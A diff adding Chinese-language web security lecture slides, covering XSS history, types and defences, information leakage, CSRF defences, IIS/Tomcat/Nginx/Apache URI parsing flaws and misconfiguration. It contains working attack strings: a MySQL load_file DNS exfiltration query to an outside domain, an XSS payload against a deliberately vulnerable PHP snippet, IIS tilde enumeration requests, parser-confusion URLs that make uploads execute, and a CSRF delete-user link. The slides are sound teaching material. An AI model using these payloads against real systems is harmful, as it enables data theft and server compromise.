@@ -1540,13 +1540,237 @@ select load_file(concat('\\\\', version(), '.6a7087aa4e3b2c743ed1.d.zhack.ca\\1.
 
 ---
 
+## XSS 考古 {id="xss-history"}
+
+* 跨站点脚本（Cross-Site Scripting，XSS）的简写没有采用 `CSS` 是为了避免和另一个术语 `层叠样式表（Cascading Style Sheet）` 产生歧义
+* 公开资料最早提及 XSS 威胁的来自于 1996 年 6 月 30 日 `comp.sys.acorn.misc` 新闻组的一条消息，如下页图所示。
+
+---
+
+![](images/chap0x07/xss-history-1.png)
+
+---
+
+## “古代” XSS 的漏洞利用效果 {id="xss-impacts-in-the-old-days"}
+
+* 盗取用户浏览历史记录
+* 盗取用户邮箱地址
+* 下载恶意文件并诱骗用户打开运行
+* 遍历磁盘上的文件
+
+---
+
+## XSS 的前身：恶意浏览器脚本 {id="evil-livescript"}
+
+* 1995 年 9 月 18 日，Netscape Navigator 2.0 发布。一个月后 Netscape 为其下一个公开测试版浏览器上线了“漏洞悬赏（Bugs Bounty）”计划并在一周后收到了第一个漏洞报告
+    * `恶意 LiveScript（JavaScript 语言的前身） 可以用于盗取用户在访问指定恶意网页之前的所有的浏览历史记录`
+* 相比二进制漏挖和利用的难度和时间成本，脚本漏洞挖掘和利用更容易、效果也有特别惊人的时候
+    * 客户端脚本漏洞攻防研究开始成为安全行业关注热点
+
+---
+
+## 现代 XSS {id="modern-xss-1"} 相比 `“古代” XSS`
+
+* 漏洞利用目标没变：跨域访问（读取和篡改）数据
+* 漏洞基本原理没变：恶意代码运行在浏览器上
+    * 混合式应用的流行使得原生应用和 Web 应用的边界变得模糊：『无头浏览器』和『嵌入式 JS 引擎』流行起来
+
+---
+
+## 现代 XSS 相比 `“古代” XSS` 漏洞挖掘难度“没变” {id="modern-xss-2"}
+
+[![](images/chap0x07/xss-cve-history-1.png)](https://www.cvedetails.com/vulnerabilities-by-types.php)
+
+> 相比于年度漏洞总数的变化趋势，XSS 的漏洞总数变化非常稳定
+
+---
+
+## 现代 XSS 相比 `“古代” XSS` 漏洞挖掘难度“没变” {id="modern-xss-3"}
+
+[![](images/chap0x07/xss-cve-history-2.png)](https://www.cvedetails.com/vulnerabilities-by-types.php)
+
+> 众所周知「预编译 SQL 语句」的普及使得 SQL 注入漏洞挖掘难度越来越高，所以 SQL 注入漏洞的年度统计趋势是呈明显下降趋势的
+
+---
+
+## 现代 XSS 相比 `“古代” XSS` 利用价值“稳中有升” {id="modern-xss-4"}
+
+[![](images/chap0x07/xss-cve-history-3.png)](https://www.cvedetails.com/vulnerabilities-by-types.php)
+
+> 只看 XSS 漏洞数量的年度统计，“稳中有升”的曝光数量间接证明了其利用价值是“稳中有升”的：从投入产出比的经济学角度思考
+
+---
+
+## 现代 XSS 相比 `“古代” XSS` 的主要变化 {id="modern-xss-features"}
+
+* 客户端碎片化趋势加剧
+    * 万物互联的物联网终端设备
+* 客户端可编程能力加强
+    * 现代计算力的跨时代提升
+* 客户端安全防御水平参差不齐
+    * 原因复杂，但现状和趋势未见有明确改变的路径
+* 客户端代码复杂度提升
+    * 前端框架的繁荣和前端工程化水平的发展轨迹
+
+---
+
+## 为什么 XSS 被归类到「输出相关漏洞」 {id="why-xss-is-output-based"}
+
+```php
+<?php
+$msg = $_GET['msg'];
+// 用户提交的消息被作为关键字提交到后台进行信息检索
+// 页面同时把用户输入的搜索关键词展示出来
+echo "<div>$msg</div>";
+```
+
+---
+
+## 可能是最简单的一种「漏洞攻击」`代码` {id="the-simplest-exp-code"}
+
+```html
+<img src=1 onerror=alert(1)>
+```
+
+“攻击者”在访问包含上述 PHP 代码的网页时，在浏览器地址栏里输入查询参数 `msg=` 上述 `XSS 攻击代码` 后回车，将会看到当前浏览的页面出现一个「警告对话框」，显示内容为 `1` 。
+
+![](images/chap0x07/xss-firefox.png)
+
+---
+
+## XSS 也太好学了吧？ {id="is-xss-really-easy"}
+
+> Too young, too simple!
+
+---
+
+![](images/chap0x07/xss-firefox-blame.png)
+
+> 为什么 2018 年 8 月写作本节内容时是在 Firefox 浏览器上实验并截图的呢？因为彼时的 Google Chrome 有专门 XSS 的内置启用防御组件 `xss-auditor` ，这段代码在彼时的 Google Chrome 上是无法运行成功的！
+
+---
+
+![](images/chap0x07/xss-chrome.png)
+
+---
+
+> 前方「倒车」请注意，请猜猜哪个浏览器是 Google Chrome ？
+
+![](images/chap0x07/xss-hello-world-in-2020.08.27.png)
+
+---
+
+## Google Chrome 主动放弃 XSS-Auditor {id="why-xss-auditor-is-discontinued"}
+
+[![](images/chap0x07/xss-auditor-removed.png)](https://www.chromium.org/developers/design-documents/xss-auditor)
+
+---
+
+### 正方（支持放弃 XSS-Auditor）观点 {id="positive-to-abandon"}
+
+* Web 脚本代码自身的漏洞就应该依赖于提高代码质量来解决，而不是依赖于「通用」缓解措施
+    * 是不是在学习 `SQL 注入的安全解决方案` 时听过类似的观点？
+* 浏览器开发者不能总惯着前端工程师，是时候 “放手” 让他们成长了
+    * 新一批工程师们多学点「安全开发知识」，从代码层面杜绝掉 XSS 漏洞
+        * 学会用浏览器的 `CSP 安全策略` 、`Cookie 安全机制里的 HttpOnly 属性`
+* 误报太多，影响复杂前端渲染和交互逻辑的实现
+
+---
+
+### 反方（反对放弃 XSS-Auditor）观点 {id="negative-to-abandon"}
+
+* 在浏览器底层多做一层「安全缓解」措施，这是符合「纵深防御」黄金策略原则的
+* 指望“这一届”程序员们学会安全开发？呵呵。再等等“下一届”吧。
+
+---
+
+> 八卦结束，回到正题。
+
+---
+
+* 前一个演示的这个 XSS 效果对应的 XSS 类型被称为 `“反射型” XSS`
+    * `反射型 XSS` 只是简单地把用户输入的数据“反射”给浏览器
+    * 攻击者往往需要诱骗用户“点击”一个恶意链接，链接中包含 XSS 代码，才能攻击成功
+    * 反射型 XSS 也被称为 `“非持久型 XSS”`
+
+---
+
+## XSS 漏洞类型分类 {id="xss-types"}
+
+* `“反射型” XSS` （ Reflective XSS，也被称为 `“非持久型 XSS”`）
+* 存储型 XSS （Stored XSS）
+    * 利用浏览器的 `客户端存储机制` 存储 XSS 攻击代码
+    * 利用服务器端的数据库等持久化存储机制存储 XSS 攻击代码
+* 基于文档对象模型的 XSS（DOM Based XSS）
+    * 早期也被视为 `“反射型” XSS`
+    * [Amit Klein 在 2005 年的一篇技术报告](http://www.webappsec.org/projects/articles/071105.shtml) 首先提出 `DOM Based XSS` 这个概念，业界自此逐渐接受这个更精细化的分类
+    * 演变发展过程中结合了 `客户端存储机制` 实现了持久化的 `DOM Based XSS`
+
+---
+
+## XSS 漏洞利用很难通杀所有浏览器 {id="xss-exploit-obstacles"}
+
+![](images/chap0x07/xss-hello-world-in-2020.08.27-with-notes.png)
+
+---
+
+## 离开 JavaScript 也能来一次 XSS 攻击 {id="xss-without-js"}
+
+![页面篡改钓鱼](images/chap0x07/noscript-xss.png)
+
+---
+
+## XSS 实战技巧 {id="xss-in-real"}
+
+* 在绝大多数情况下，XSS 中都会包含 JavaScript 代码，以完成更高级的漏洞利用效果
+* 从攻击者角度看 XSS
+    * 发现和验证 XSS 的存在性虽然容易，但只是第一步
+    * 和谐完美利用达到最大化漏洞利用效果非常不容易
+    * 工具党的福音 [BeEF, The Browser Exploitation Framework](https://beefproject.com/) 
+
+---
+
+## 防御 XSS {id="prevention-to-xss-1"}
+
+* 服务端脚本在「输出」数据时，要进行「转义」操作
+* 「输出」数据的「转义」要按内容是 HTML 还是 JavaScript 进行区别操作，以下以 PHP 代码为例说明具体操作注意事项：
+    * 对于 HTML 的输出转义应使用 [`htmlspecialchar()`](http://php.net/manual/zh/function.htmlspecialchars.php) 函数（且大多数情况下应在第二个参数设置 `ENT_QUOTES` 来转义单引号）
+    * 对于 JavaScript 的输出转义，特别是涉及到 JavaScript 变量的过滤仅仅使用 `htmlspecialchars()` 是不够的，很多 RESTful 接口应用还会使用 `json_encode()` 去处理服务端脚本输出给客户端的 JavaScript 变量值
+
+---
+
+## 防御 XSS {id="prevention-to-xss-2"}
+
+* 在客户端脚本中尽可能使用 `innerText()` 之类的函数来过滤服务端脚本对客户端变量的赋值
+* 联合现代浏览器的客户端安全机制，共同对抗 XSS
+    * 在服务端输出 HTML 时，加上 [`Content Security Policy`](https://w3c.github.io/webappsec-csp/) 的 HTTP 响应头
+    * 低版本浏览器可能不支持，但某些低版本浏览器支持一些自定义 HTTP 响应头 [X-XSS-Protection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection) 来限制加载执行不可信脚本
+    * 在设置 Cookie 时，加上 HttpOnly 参数避免关键 Cookie 字段被脚本访问
+
+---
+
+## 防御 XSS {id="prevention-to-xss-3"}
+
+* 由于 XSS 漏洞的实际触发位置是在浏览器，因此即使按照上述服务端脚本的代码安全最佳实践去实现「净化」输出，但如果 XSS 漏洞再利用一些浏览器漏洞（特别是一些字符集编码漏洞）进行配合，那么依然难免 XSS 漏洞
+* 不过好在这种情况发生的概率要远远低于由于服务端脚本没有「净化」输出导致的 XSS
+* 使用正确的「净化」输出方案是在代码级别防御 XSS 的最重要手段
+
 # 14. 信息泄露 {id="info-leakage"}
 
 ---
 
+* 代码运行时调试信息泄露
+    * 例如前述 `SQL 注入漏洞` 在有错误信息回显时的漏洞利用难度会大大降低
+* 隐私数据未做脱敏操作就输出给客户端
+    * 如信用卡号、手机号、身份证号等，在发送给前端之前用星号代替
+    * 中国的 18 位公民身份证号码从最早的全部明文显示在软件界面上，发展经历了遮蔽4位数字、8位数字，直到只显示首末 2 位数字（如支付宝）
+    * 非必需展示和发送给客户端的数据，应避免在服务端脚本直接输出
+
 # 再看一个输入相关的有趣漏洞
 
 ---
+
+CSRF 漏洞
 
 # 15. CSRF 漏洞 {id="csrf"}
 
@@ -1592,7 +1816,7 @@ http://victim.org/addFriend.do?friend=attacker@gmail.com
 
 ---
 
-## 与 XSS 的联系
+## 与 XSS 的联系 {id="csrf-vs-xss"}
 
 * 跨站点请求伪造通常伴随 XSS 漏洞利用过程
 * 先有 XSS，再有 CSRF
@@ -1603,6 +1827,56 @@ http://victim.org/addFriend.do?friend=attacker@gmail.com
 * 一个URL即可触发一次CSRF
     * http://victim.org/deluser.php?id=admin
 
+---
+
+## 防御 CSRF {id="prevention-to-csrf-1"}
+
+1. 对 `HTTP Header` 中的 `Referer` 字段进行验证
+
+* `HTTP Referer` 字段记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站
+    * 只需要对于每一个 POST 请求验证其 Referer 值，如果是来源于「受信任」域名的请求，则接受
+    * 如果 Referer 是其他网站的话，就有可能是 CSRF 攻击，则拒绝该请求
+
+---
+
+## 防御 CSRF {id="prevention-to-csrf-2"}
+
+2. 在 POST 请求中添加 token 作为参数并验证
+
+* 这种安全策略被各种 Web 框架广泛采用（包括 `Laravel` 等）
+* CSRF 漏洞能够被利用的主要原因就是用户的全部验证信息均保存在 `Cookie` 中，攻击者可以在不接触到 `Cookie` 的前提下完成身份验证
+    * 只需在请求中设置一个攻击者所无法伪造的、不可预测的 `token`，且保证这个 `token` 与 `Cookie` 是毫无关联的
+    * 此外，还应保证这个 `token` 是独立且不重复使用的
+    * 在服务端验证用户身份时应同时对 `Cookie` 及 `token` 进行验证
+        * 这个 `token` 被称为 `csrftoken`，在 HTML 的表单中，该字段的输入域往往是隐藏的
+
+---
+
+## 防御 CSRF {id="prevention-to-csrf-3"}
+
+3. 在 HTTP 头中自定义属性并验证
+
+* 自定义属性的方法也是使用 token 并进行验证，和前一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 `HTTP Header` 中自定义的属性里
+* 当前一种方法实现不便的情况下，可以采用这种安全策略进行系统加固
+
+---
+
+## 防御 CSRF {id="prevention-to-csrf-4"}
+
+4. 添加验证码并验证
+
+* 可以在表单中增加随机验证码，采用强制用户与 Web 应用进行交互的方式防止 CSRF 攻击
+    * 登录验证、交易等针对危险操作的接口
+    * 但强制所有请求都使用验证码往往也是不现实的
+* 在实战中， Web 程序往往采用在 POST 请求中添加 token 作为参数并验证的方法作为防止 CSRF 漏洞的安全策略
+    * 禁止将 `csrftoken` 作为 GET 参数进行请求，防止请求地址被记录到浏览器的地址栏，也防止 token 通过 Referer 泄露到其他网站
+
+---
+
+## 防御 CSRF {id="prevention-to-csrf-4"}
+
+以上 4 条防御方法通常是「组合使用」，而不是「单一」应用。
+
 # 平台相关漏洞
 
 ---
@@ -1610,15 +1884,142 @@ http://victim.org/addFriend.do?friend=attacker@gmail.com
 * Web 服务器 URI 解析类漏洞
 * 不当配置缺陷
 
----
-
-
 # 16. Web 服务器 URI 解析类漏洞 {id="web-svr-uri-parse-vul"}
 
+---
+
+* 在 `文件上传` 漏洞一节我们介绍过了 [CVE-2013-4547](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4547) 这个 Nginx 文件名解析逻辑漏洞。
+* 下面我们按照 URI 解析类漏洞造成的影响效果进行分类介绍
 
 ---
+
+## 目录遍历或信息泄漏
+
+* 2012 年 6 月知名 Web 安全专家 Soroush Dalili 公布了微软 IIS 服务器在[处理 `~` 字符时的缺陷](https://soroush.secproject.com/blog/2012/06/microsoft-iis-tilde-character-vulnerabilityfeature-short-filefolder-name-disclosure/)导致服务器上任意文件可被枚举探测存在性
+    * 这个漏洞存在的根本原因是微软在 DOS 时代设计的针对长文件名的自动缩短 `8.3` 命名规则
+
+---
+
+### `8.3` 命名规则的一次滥用过程 {id=""rules-of-8.3"} 
+
+* 例如，文件名 `exampletest.txt` 按照 `8.3` 命名规则会被自动转换为 `EXAMPL~1.txt`。如果此时该目录下存在另一个文件名 `examplefile.txt`，则按照 `8.3` 命名规则该文件会被自动转换为 `EXAMPL~2.TXT`
+* 注意，`8.3` 规则命名的文件和原文件名是等价的，操作系统会负责解析加载 `8.3` 规则命名的正确文件
+* 攻击者为了探测服务器上是否存在一个名为 `exampletest.txt` 的文件，可以采用如下步骤发送 HTTP GET 请求进行枚举探测：
+
+---
+
+```c
+http:/example.com/*~1*/.aspx
+// 如果服务器返回状态码 404 说明服务器上存在不止一个 8.3 命名规则的文件
+
+http:/example.com/e*~1*/.aspx
+// 如果服务器返回状态码 404 说明服务器上存在不止一个字母 e 开头的文件
+
+http:/example.com/eb*~1*/.aspx
+// 如果服务器返回状态码 400 说明服务器上不存在字母 eb 开头的文件
+
+http:/example.com/ex*~1*/.aspx
+// 如果服务器返回状态码 404 说明服务器上存在不止一个字母 ex 开头的文件
+
+// 如此不断增加探测字符串长度即可完成指定服务器文件的枚举探测
+```
+
+---
+
+### Tomcat 4.x 时代的 JSP 源代码泄漏漏洞 {id="tomcat-4.x-source-leak"}
+
+* 漏洞起因在于 Windows 平台上的文件名是不区分大小写的，但 Java 运行环境中对于文件名是区分大小写的
+* Tomcat 4.x 的默认 URI 解析映射规则是对于 `.jsp` 扩展名的文件请求会在服务器端解析执行 JSP 代码后再输出结果给浏览器
+* 但如果客户端访问的文件扩展名是 `.JSP` 时，只要该文件路径在 Windows 系统上确实存在有效，但由于不是 Tomcat 的 JSP 引擎所期望的全小写字母，则会按照默认的文本文件处理，即直接读取文件内容并输出返回给浏览器，从而导致 JSP 源代码泄漏
+
+---
+
+> 故意访问一个不存在页面，借助服务器报错信息我们确认 Tomcat 版本是 4.1.27，存在该漏洞
+
+![](images/chap0x07/tomcat-information-disclosure-2.png)
+
+---
+
+> 访问 `.JSP` 扩展名时服务器直接泄漏了源代码
+
+![](images/chap0x07/tomcat-information-disclosure-1.jpg)
+
+
+---
+
+## 代码执行 {id="code-exec-in-web-infrastructure"}
+
+* 上述 `CVE-2013-4547` 漏洞就可以导致 Web 服务器将非脚本文件扩展名对应的文件当作服务端脚本解析并执行
+    * `IIS 5.x/6.0 解析漏洞`
+    * `IIS 6.0 文件解析漏洞`
+    * `IIS 7.0/IIS 7.5/ Nginx < 0.8.3 畸形 URI 解析漏洞`
+    * `Apache 解析漏洞`
+
+---
+
+## 代码执行示例
+
+```bash
+# IIS 5.x/6.0 解析漏洞
+# 在网站下建立文件夹的名称中带有.asp、.asa等可执行脚本文件后缀为后缀的文件夹，其目录内的任何扩展名的文件都被 IIS 当作脚本文件来解析并执行
+http://www.vul.com/vul.asp/vul.jpg
+
+# IIS 6.0 文件解析漏洞
+# IIS 6.0 分号后面的数据不被解析，也就是说 vul.asp;.jpg 将被当做 vul.asp 解析并执行
+http://www.vul.com/vul.asp;.jpg
+
+# IIS 7.0/IIS 7.5/ Nginx < 0.8.3 畸形 URI 解析漏洞
+# 在默认 Fast-CGI 开启状况下，访问以下网址，服务器将把 vul.jpg 文件当做 PHP 解析并执行
+http://www.vul.com/vul.jpg/vul.php
+
+# Apache 解析漏洞
+# Apache 对文件解析是从右到左开始判断解析。如果文件的扩展名没有配置默认的处理程序，就再往左判断解析。 如 vul.php.owf.rar，由于Apache无法解析 rar 和 owf 扩展名，但能够解析 php 扩展名，因此 Apache 会将 vul.php.owf.rar 当做 PHP 代码进行解析并执行
+http://www.vul.com/vul.php.owf.rar
+```
+
+---
+
+## 拒绝服务
+
+* 还是前述 `8.3 命名规则滥用漏洞`，精心构造的包含一堆 `~` 字符的 URI 请求还可以导致 [.NET 框架拒绝服务](http://soroush.secproject.com/downloadable/iis_tilde_dos.txt)
+* 类似的漏洞还有如 Apache 的[CVE-2018-1303](https://nvd.nist.gov/vuln/detail/CVE-2018-1303)、[CVE-2015-0253](https://nvd.nist.gov/vuln/detail/CVE-2015-0253)、[CVE-2004-0786](https://nvd.nist.gov/vuln/detail/CVE-2004-0786) 等等
+
+---
+
+## 防御 Web 服务器 URI 解析类漏洞 {id="prevention-to-web-svr"}
+
+* 升级版本
+* 根据官方漏洞通告自己对存在漏洞的服务器打补丁
+* 如果在不确定版本升级或打补丁是否会对运行在服务器上的代码带来兼容性方面的负面影响，还可以通过部署防火墙、入侵检测系统和应用防火墙等第三方安全系统来 **缓解**
 
 
 # 17. 不当配置缺陷 {id="cce"}
 
+---
+
+* `IIS 7.0/IIS 7.5/ Nginx < 0.8.3 畸形 URI 解析漏洞`
+* MySQL 的 `secure_file_priv` 参数正确配置对 SQL 注入时利用 DNS 进行带外数据传输的拦截作用
+
+以上 2 个例子分别体现了错误的服务配置和正确的服务配置在提升系统安全性方面的截然不同的两种效果
+
+---
+
+* Nginx 的这个 URI 解析漏洞在不升级版本的情况下，实际只需要通过配置 `cgi.fix_pathinfo=0` 即可封堵上这个解析漏洞
+* 如果需要自己通过配置的方式加固服务器基础软件（如 Web 服务器），强烈建议阅读官方文档中有关安全加固的内容
+* 对于现代流行的服务器基础软件，大多数在发布的时候已经注意到遵循 `默认安全（secure by default）`理念去保证默认配置的安全性
+
+---
+
+⚠️ ⚠️ ⚠️  **需要特别注意的是** ⚠️ ⚠️ ⚠️  
+
+* 类似 [XAMPP](https://www.apachefriends.org/) 这样的面向开发环境而非生产环境的一键式基础服务软件安装配置工具所提供的缺省配置往往不能直接应用于生产环境
+    * 其默认配置是面向开发调试环境优化的，很多情况下会默认开启调试模式和允许更详细和丰富的错误日志信息回显等
+        * 以上这些都是在生产环境中需要极力规避的危险设置
+
+# 延伸阅读
+
+---
+
+* [【代码审计】PHP文件包含漏洞利用总结](http://vinc.top/2016/08/25/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/)
+* [CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/)
 
